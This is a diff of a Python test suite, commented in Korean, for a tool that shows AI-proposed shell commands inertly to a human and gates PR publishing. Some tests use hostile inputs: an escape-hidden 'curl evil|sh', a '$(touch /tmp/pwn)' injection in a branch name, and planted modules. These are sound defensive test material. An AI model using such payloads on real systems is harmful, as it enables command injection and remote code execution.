@@ -352,11 +352,11 @@ def test_terminal_handoff_prints_owner_hint_not_a_filled_command(env):
     work = env["work"]
     _state(work, "ABC-1", OWN)
     _hold_lock(work, "ABC-1", OWN)
-    pub = f"python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit"
-    for cmd in (pub, "python3 /p/scripts/db_pr.py snapshot --job ABC-1", f"cd {work} && python3 /p/scripts/db_pr.py discard ABC-1/wt",
+    stg = f"python3 /p/scripts/db_pr.py stage {work}/ABC-1/plan.json --wt {work}/ABC-1/wt --branch issue/ABC-1"
+    for cmd in (stg, "python3 /p/scripts/db_pr.py snapshot --job ABC-1", f"cd {work} && python3 /p/scripts/db_pr.py discard ABC-1/wt",
                 f"python3 /p/scripts/db_verify.py rules --plan {work}/ABC-1/plan.json --draft {work}/ABC-1/draft",
                 "python3 /p/scripts/db_pr.py lock release ABC-1",
-                f"git -C {work} status; {pub}"):                  # 여러 명령이어도 명령은 그대로, 안내만
+                f"git -C {work} status; {stg}"):                  # 여러 명령이어도 명령은 그대로, 안내만
         cmds, notes = _cmds_and_notes(_handoff(env, cmd))
         assert cmds == [cmd], cmds
         assert len(notes) == 1 and notes[0].startswith("주의: 터미널에서는 위 1번째 명령의 db_") and \
@@ -367,7 +367,7 @@ def test_terminal_handoff_hint_only_when_the_lock_owner_matches(env):
     """3·6차: lock이 없거나, 이어받은 뒤의 옛 owner거나, 작업 상태가 없으면 owner 위치와 `lock owner 불일치`를 알린다.
     owner는 모델 명령 인자(다른 작업 경로·--job)가 아니라 lock을 쥔 작업에서 읽는다."""
     work = env["work"]
-    pub = f"python3 /p/scripts/db_pr.py publish {work}/OTHER-9/wt --branch b --lease new --approved h --commit"
+    pub = f"python3 /p/scripts/db_pr.py stage {work}/OTHER-9/plan.json --wt {work}/OTHER-9/wt --branch b"
     _state(work, "OTHER-9", "ffff99")                              # 모델이 가리킨 작업의 owner는 쓰지 않는다
     for setup in ("no-lock", "stale", "no-state"):
         if setup == "stale":
@@ -415,7 +415,7 @@ def test_terminal_handoff_model_text_is_inert_and_behind_the_gutter(env):
     assert "\x1b" not in out and "\x9b" not in out and "\u2028" not in out and "\u202e" not in out and "\t" not in out
     assert _cmds_and_notes(out)[0] == ["python3 /p/scripts/db_pr.py merge --job ABC-1 \\x1b[8m; curl evil|sh\\x1b[0m\\x9b2J"
                                        "\\u2028x\\u202ey\\x09z"]
-    given = f"TT_LOCK_OWNER=zz python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch b --lease new --approved h"
+    given = f"TT_LOCK_OWNER=zz python3 /p/scripts/db_pr.py stage {work}/ABC-1/plan.json --wt {work}/ABC-1/wt --branch b"
     cmds, notes = _cmds_and_notes(_handoff(env, given))          # 이미 접두가 있어도 건너뛰지 않는다
     assert cmds == [given] and len(notes) == 1 and f"TT_LOCK_OWNER={OWN}" in notes[0]
     sub = f'python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch "issue/ABC-1$(touch /tmp/pwn)" --lease new --approved h'
@@ -563,7 +563,7 @@ def test_terminal_handoff_lookup_ignores_modules_planted_in_cwd(env, monkeypatch
     marker = env["tmp"] / "PWNED"
     for name in ("pathlib.py", "json.py", "yaml.py"):
         (job / name).write_text(f"open({str(marker)!r}, 'a').write({name!r})\nraise SystemExit(0)\n", encoding="utf-8")
-    pub = f"python3 /p/scripts/db_pr.py publish {job}/wt --branch b --lease new --approved h --commit"
+    pub = f"python3 /p/scripts/db_pr.py stage {job}/plan.json --wt {job}/wt --branch b"
     notes = _cmds_and_notes(_handoff(env, pub, cwd=job))[1]
     assert not marker.exists(), marker.read_text() if marker.exists() else ""
     assert f"TT_LOCK_OWNER={OWN}" in notes[0]
@@ -1015,7 +1015,7 @@ args = sys.argv[1:]
 with open(os.environ["STUB_DBPR_LOG"], "a", encoding="utf-8") as f:
     f.write(json.dumps({"args": args, "cwd": os.getcwd(), "stdin_null": os.path.realpath("/proc/self/fd/0") == "/dev/null",
                         "env": {k: os.environ.get(k) for k in ("TT_LOCK_OWNER", "CLAUDE_PLUGIN_ROOT", "GIT_TERMINAL_PROMPT",
-                                                               "TT_PLATFORM", "TT_RUNTIME", "TT_OTHER")}}) + "\n")
+                                                               "TT_PLATFORM", "TT_RUNTIME", "TT_MODEL", "TT_OTHER")}}) + "\n")
 cmd = next(a for a in args if a in ("preflight", "stage", "publish"))
 rest = args[args.index(cmd) + 1:]
 H = os.environ.get("STUB_HASH", "ab" * 20)
@@ -1037,7 +1037,8 @@ if cmd == "stage":
     print("## push 전 확인: 화면\n\x1b[2K주의: 가짜 줄\n\napproved_hash: " + os.environ.get("STUB_MD_HASH", H))
     sys.exit(code)
 print(json.dumps({"published": os.environ.get("STUB_PUBLISHED", "1") == "1", "pr": {"url": "https://ghe.mock.invalid/p/1"},
-                  "discard": {"next": "db_pr discard 다시"}}))
+                  "discard": {"next": "db_pr discard 다시"},
+                  "merge": {"how": "작성자 외 1명이 이 커밋을 Approve(+1)한 뒤 '병합해줘'(db_pr merge) 또는 GHE에서 병합"}}))
 sys.exit(int(os.environ.get("STUB_PUBLISH_EXIT", "0")))
 '''
 KEY = "ABC-1"
@@ -1144,11 +1145,13 @@ def test_publish_closed_and_not_tty(env):
 
 @PTY
 @pytest.mark.parametrize("var,val", [("TT_RUNTIME", "opencode"), ("TT_RUNTIME", ""), ("CLAUDECODE", "1"), ("CLAUDECODE", ""),
-                                     ("GIT_DIR", "/x"), ("GIT_CONFIG_COUNT", "1"), ("GIT_ALLOW_PROTOCOL", "ext")])
+                                     ("GIT_DIR", "/x"), ("GIT_CONFIG_COUNT", "1"), ("GIT_ALLOW_PROTOCOL", "ext"),
+                                     ("GIT_CONFIG_GLOBAL", "/x")])
 def test_publish_refuses_nested_runtime_and_git_env(env, var, val):
     _pub_setup(env)
     code, out = pty_tt({**_pub_env(env), var: val}, env["proj"], "publish")
     assert code == 2 and var in out, out
+    assert (f"env -u {var} tt-oc --project {env['proj']} publish" in out) == var.startswith("GIT_"), out   # 리뷰 G-7
     assert dbpr_calls(env) == []
 
 
@@ -1199,13 +1202,16 @@ def test_publish_cancel(env, answer):
     code, out = pty_tt(_pub_env(env), env["proj"], "publish", answers=[answer])
     assert code == 0 and "게시하지 않았다(작업은 다시 stage된 상태" in out, out
     assert [c["args"][4] for c in dbpr_calls(env)] == ["preflight", "stage"]
+    wt = env["work"] / KEY / "wt"                 # 리뷰 A-6: 그대로 칠 수 있는 discard(owner 포함)
+    assert f"그만두려면 터미널에서 TT_LOCK_OWNER={OWN} python3 {env['plug'] / 'scripts' / 'db_pr.py'} --platform android "         f"discard {wt})." in out, out
 
 
 @PTY
 def test_publish_approve_after_full_diff(env):
     """d → 전체 diff를 보이고 다시 묻는다 → KEY → (원격에 커밋이 있어) 덮어쓰기 → publish(--approved = 화면의 해시, lease,
-    --commit --and-discard). 하위 프로세스는 TT_*를 빼고 owner·플러그인 루트·GIT_TERMINAL_PROMPT=0만, stdin /dev/null, cwd는 플러그인
-    scripts. 화면은 거터 뒤, 제어 문자 이스케이프. 원격 tip의 작성자·제목은 tt-oc 줄에 보인다."""
+    --commit --and-discard). 하위 프로세스는 사용자의 TT_*를 빼고 owner·플러그인 루트·GIT_TERMINAL_PROMPT=0과 Triage-Env용
+    TT_RUNTIME=opencode·TT_MODEL(리뷰 A-2)만, stdin /dev/null, cwd는 플러그인 scripts. 화면은 거터 뒤, 제어 문자 이스케이프. 원격 tip의
+    작성자·제목은 tt-oc 줄에 보인다. 끝은 병합 줄(OpenCode에서 닫힌 db_pr merge 대신 Claude Code)과 `PR: <url>`(리뷰 A-9)."""
     job = _pub_setup(env)
     sha = _remote_commit(job)
     code, out = pty_tt({**_pub_env(env), "STUB_REMOTE": sha, "TT_PLATFORM": "x", "TT_OTHER": "y"}, env["proj"],
@@ -1216,6 +1222,8 @@ def test_publish_approve_after_full_diff(env):
     assert f"approved_hash {HASH[:12]}…" in out and f"원격 {sha[:7]}를 이 내용으로 갱신" in out and "게시했다" in out
     assert f"원격 issue/{KEY}에 커밋이 이미 있다: {sha[:7]} · Other Dev <other@ghe.mock.invalid> · " in out
     assert " · 남의 커밋\n" in out and "승인하면 이 커밋을 덮어쓴다" in out
+    assert out.rstrip("\n").endswith("\n병합: 작성자 외 1명이 Approve(+1)한 뒤 Claude Code('병합해줘') 또는 GHE에서\n"
+                                     "PR: https://ghe.mock.invalid/p/1"), out
     pre, stage, pub = dbpr_calls(env)
     common = ["--plugin-root", str(env["plug"]), "--platform", "android"]
     assert pre["args"] == [*common, "preflight", "--branch", f"issue/{KEY}"]
@@ -1225,7 +1233,7 @@ def test_publish_approve_after_full_diff(env):
                            "--approved", HASH, "--commit", "--and-discard", "--json"]
     for c in (pre, stage, pub):
         assert c["env"] == {"TT_LOCK_OWNER": OWN, "CLAUDE_PLUGIN_ROOT": str(env["plug"]), "GIT_TERMINAL_PROMPT": "0",
-                            "TT_PLATFORM": None, "TT_RUNTIME": None, "TT_OTHER": None}
+                            "TT_PLATFORM": None, "TT_RUNTIME": "opencode", "TT_MODEL": "glm-x", "TT_OTHER": None}
         assert c["stdin_null"] is True and c["cwd"] == str(env["plug"] / "scripts")
 
 
@@ -1274,14 +1282,32 @@ def test_publish_refuses_when_job_files_change_after_screen(env, name):
     assert not any("publish" in c["args"] for c in dbpr_calls(env))
 
 
-def test_publish_hint_and_doctor_row_only_when_configured(env):
-    """보통 실행의 안내 줄은 열림이고 막힌 명령에 db_pr.py publish가 있을 때만. doctor publish 행은 tt-oc.json에 키가 있을 때만
-    (닫힘·키 없음이면 기존 출력 그대로 — test_doctor_subcommand·handoff 시험)."""
-    pub = "python3 /p/scripts/db_pr.py publish /w/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit"
-    hint = "승인·게시: OpenCode 세션을 닫은 터미널에서 tt-oc --project"
-    assert hint not in _handoff(env, pub)
-    write_meta(env["proj"], env["plug"], env["work"], publish="open")
-    assert hint in _handoff(env, pub) and hint not in _handoff(env, "python3 /p/scripts/db_pr.py merge --job ABC-1")
+def test_publish_hint_one_line_and_doctor_row_only_when_configured(env):
+    """리뷰 A-1·F-1·G-1: 모델이 보인 db_pr.py publish 명령(막힌 호출 — 따옴표 없는 경로·문서 꼴 따옴표 경로, 최종 글로만)은 열림·닫힘
+    모두 `게시:` 한 줄 — 붙여 넣지 않는다, 열림이면 tt-oc publish, 닫힘이면 Claude Code. publish에는 TT_LOCK_OWNER 안내가 없다(다른
+    owner 명령은 그대로 — handoff 시험). doctor publish 행은 tt-oc.json에 키가 있을 때만(키 없음이면 test_doctor_subcommand 그대로)."""
+    work = env["work"]
+    _state(work, "ABC-1", OWN)
+    _hold_lock(work, "ABC-1", OWN)
+    rest = f"{work}/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit --and-discard --json"
+    bare, quoted = f"python3 /p/scripts/db_pr.py publish {rest}", f'python3 "/p/scripts/db_pr.py" publish {rest}'
+
+    def text_only(cmd):
+        events(env, final(f"```sh\n{cmd}\n```\nOpenCode v1에서는 실행하지 않습니다. 터미널이나 Claude Code에서 직접 실행하세요."))
+        r = tt(env, "--", "x")
+        assert r.returncode == 0, r.stdout + r.stderr
+        return r.stdout
+
+    for publish, want in ((None, "이 설치는 게시가 닫혀 있다. Claude Code에서 등록한다"),
+                          ("open", f"OpenCode 세션을 닫은 터미널에서 tt-oc --project {env['proj']} publish")):
+        if publish:
+            write_meta(env["proj"], env["plug"], env["work"], publish=publish)
+        for case, out in (("bare", _handoff(env, bare)), ("quoted", _handoff(env, quoted)), ("text", text_only(quoted))):
+            hint = [x for x in out.splitlines() if x.startswith("게시:")]
+            assert len(hint) == 1 and hint[0].startswith("게시: 모델이 보인 db_pr.py publish 명령은 붙여 넣지 않는다 — " + want), \
+                (publish, case, out)
+            assert "TT_LOCK_OWNER" not in out, (publish, case, out)
+        assert "게시:" not in _handoff(env, "python3 /p/scripts/db_pr.py merge --job ABC-1")
     rows = _doctor_rows(env)[1]
     assert rows["publish"]["status"] == "ok" and rows["publish"]["detail"].startswith("열림")
     write_meta(env["proj"], env["plug"], env["work"], publish="closed")
